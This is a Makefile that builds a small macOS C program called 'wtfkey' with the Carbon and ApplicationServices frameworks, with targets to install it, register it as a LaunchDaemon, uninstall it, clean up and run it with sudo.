CC=gcc
CFLAGS=-framework ApplicationServices -framework Carbon
SOURCES=wtfkey.c
HEADERS=wtfkey.h
EXECUTABLE=wtfkey
PLIST=wtfkey.plist
INSTALLDIR=/usr/local/sbin

all: $(EXECUTABLE)

$(EXECUTABLE): $(SOURCES) $(HEADERS)
	$(CC) $(SOURCES) $(CFLAGS) -o $(EXECUTABLE)

install: $(EXECUTABLE)
	mkdir -p $(INSTALLDIR)
	cp $(EXECUTABLE) $(INSTALLDIR)

uninstall:
	rm $(INSTALLDIR)/$(EXECUTABLE)
	rm /Library/LaunchDaemons/$(PLIST)

startup:
	cp $(PLIST) /Library/LaunchDaemons

clean:
	rm $(EXECUTABLE)

run: all
	sudo ./$(EXECUTABLE)
